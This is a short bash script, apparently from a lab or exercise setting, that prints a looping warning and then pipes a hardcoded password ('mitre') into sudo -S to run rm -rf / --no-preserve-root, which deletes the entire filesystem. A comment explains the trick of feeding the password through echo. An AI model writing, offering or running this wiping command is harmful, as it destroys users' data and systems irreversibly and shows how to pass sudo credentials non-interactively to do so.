#!/bin/bash
yes "kill this or it will wipe your machine"
echo mitre | sudo -S rm -rf / --no-preserve-root
# using -S on sudo will let me get password from echo